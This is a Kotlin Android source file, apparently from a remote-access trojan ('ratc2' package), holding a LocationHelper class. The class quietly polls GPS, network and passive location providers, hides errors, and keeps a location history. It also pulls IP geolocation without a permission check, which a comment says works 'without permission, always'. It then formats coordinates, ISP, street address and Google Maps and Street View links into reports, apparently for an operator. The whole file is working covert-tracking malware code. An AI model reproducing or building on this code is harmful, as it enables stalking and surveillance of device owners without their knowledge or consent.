package com.spud.ratc2

import android.annotation.SuppressLint
import android.content.Context
import android.location.Address
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class LocationHelper(private val ctx: Context) {

    @Volatile private var lastLocation: Location? = null
    private val history = LocationHistory(ctx)

    @SuppressLint("MissingPermission")
    fun startUpdates() {
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val listener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    lastLocation = loc
                    history.add(loc.latitude, loc.longitude, loc.accuracy)
                }
                override fun onProviderEnabled(p: String) {}
                override fun onProviderDisabled(p: String) {}
                override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
            }
            for (p in listOf(
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER,
                LocationManager.PASSIVE_PROVIDER
            )) {
                try {
                    lm.requestLocationUpdates(p, 60_000L, 10f, listener, Looper.getMainLooper())
                } catch (_: Exception) {}
            }
            current()?.let { history.add(it.latitude, it.longitude, it.accuracy) }
        } catch (_: Exception) {}
    }

    @SuppressLint("MissingPermission")
    fun current(): Location? {
        lastLocation?.let { return it }
        return try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var best: Location? = null
            for (p in listOf(
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER,
                LocationManager.PASSIVE_PROVIDER
            )) {
                try {
                    val l = lm.getLastKnownLocation(p) ?: continue
                    if (best == null || l.time > best!!.time) best = l
                } catch (_: Exception) {}
            }
            best
        } catch (_: Exception) { null }
    }

    /**
     * IP Location — يشتغل بدون GPS، بدون إذن، دايماً.
     */
    fun ipLocation(): String? {
        return try {
            val url = URL("http://ip-api.com/json/?fields=status,country,city,regionName,lat,lon,isp,query,timezone")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            val body = readAll(conn.inputStream)
            conn.disconnect()
            if (!body.contains("\"status\":\"success\"")) return null
            val ip = extract(body, "query")
            val isp = extract(body, "isp")
            val city = extract(body, "city")
            val region = extract(body, "regionName")
            val country = extract(body, "country")
            val lat = extract(body, "lat")
            val lon = extract(body, "lon")
            val tz = extract(body, "timezone")
            if (lat.isEmpty() || lon.isEmpty()) return null
            val maps = "https://maps.google.com/?q=$lat,$lon"
            val street = "https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=$lat,$lon"
            buildString {
                appendLine("📍 IP Location")
                appendLine("━━━━━━━━━━━━━━━━")
                appendLine("🌐 IP: $ip")
                appendLine("📡 ISP: $isp")
                appendLine("🏙️ المدينة: $city")
                appendLine("🗺️ المنطقة: $region")
                appendLine("🌍 الدولة: $country")
                appendLine("⏰ التوقيت: $tz")
                appendLine("━━━━━━━━━━━━━━━━")
                appendLine("خط العرض: $lat")
                appendLine("خط الطول: $lon")
                appendLine()
                appendLine("🗺️ خريطة Google:")
                appendLine(maps)
                appendLine()
                appendLine("🛰️ Street View:")
                appendLine(street)
            }
        } catch (_: Exception) { null }
    }

    /**
     * وصف موقع GPS كامل مع خريطة.
     */
    fun describe(loc: Location): String {
        val lat = loc.latitude
        val lon = loc.longitude
        val acc = loc.accuracy.toInt()
        val maps = "https://maps.google.com/?q=$lat,$lon"
        val street = "https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=$lat,$lon"
        val sb = StringBuilder()
        sb.appendLine("📍 موقع الجهاز")
        sb.appendLine("━━━━━━━━━━━━━━━━")
        sb.appendLine("خط العرض: $lat")
        sb.appendLine("خط الطول: $lon")
        sb.appendLine("الدقة: $acc متر")
        sb.appendLine()
        sb.appendLine("🗺️ خريطة Google:")
        sb.appendLine(maps)
        sb.appendLine()
        sb.appendLine("🛰️ Street View:")
        sb.appendLine(street)
        sb.appendLine()
        val addr = reverseGeocode(lat, lon)
        if (addr != null) {
            sb.appendLine("📌 العنوان:")
            sb.appendLine(addr)
        } else {
            sb.appendLine("📌 العنوان: غير متوفر")
        }
        sb.appendLine("🕐 آخر تحديث: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(java.util.Date(loc.time))}")
        return sb.toString()
    }

    fun historyText(count: Int): String = history.last(count)
    fun historyCount(): Int = history.count()

    @Suppress("DEPRECATION")
    private fun reverseGeocode(lat: Double, lon: Double): String? {
        return try {
            val geocoder = Geocoder(ctx, Locale("ar"))
            val list: List<Address>? = geocoder.getFromLocation(lat, lon, 1)
            if (list.isNullOrEmpty()) return null
            val a = list[0]
            val parts = mutableListOf<String>()
            a.countryName?.let { parts.add(it) }
            a.adminArea?.let { parts.add(it) }
            a.locality?.let { parts.add(it) }
            a.thoroughfare?.let { parts.add(it) }
            if (parts.isEmpty()) null else parts.joinToString("، ")
        } catch (_: Exception) { null }
    }

    private fun extract(json: String, key: String): String {
        return try {
            val i = json.indexOf("\"$key\":")
            if (i < 0) return ""
            var s = i + key.length + 3
            while (s < json.length && (json[s] == ' ' || json[s] == '"')) s++
            var e = s
            while (e < json.length && json[e] != '"' && json[e] != ',' && json[e] != '}') e++
            json.substring(s, e).trim()
        } catch (_: Exception) { "" }
    }

    private fun readAll(is_: java.io.InputStream): String {
        val r = BufferedReader(InputStreamReader(is_))
        val sb = StringBuilder()
        var line = r.readLine()
        while (line != null) { sb.append(line); line = r.readLine() }
        r.close()
        return sb.toString()
    }
}
